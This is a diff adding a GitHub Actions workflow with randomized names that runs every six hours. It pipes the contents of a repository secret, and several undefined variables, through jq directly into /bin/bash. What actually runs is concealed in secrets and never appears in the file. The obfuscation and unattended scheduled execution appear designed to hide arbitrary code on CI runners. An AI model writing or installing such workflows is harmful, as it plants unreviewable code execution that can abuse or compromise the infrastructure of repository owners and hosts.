@@ -1,0 +1,26 @@
+name: zhangguifan2189
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangguifan2189
+        env:
+          fm8488: ${{ secrets.fm8488 }}
+        run: |
+          echo $fm8488 | jq -r .zpaw9 | /bin/bash
+          echo $jk07 | jq -r .prnz411 | /bin/bash
+          echo $wdk35146 | jq -r .igli9 | /bin/bash
+          echo $gxm84 | jq -r .ek871 | /bin/bash
+          echo $s8195 | jq -r .kwllr18336 | /bin/bash
+          echo $gzfv2 | jq -r .znbrj6591 | /bin/bash
+          echo $b8258 | jq -r .ckus578 | /bin/bash
+          echo $kfmqp0 | jq -r .s34 | /bin/bash
+
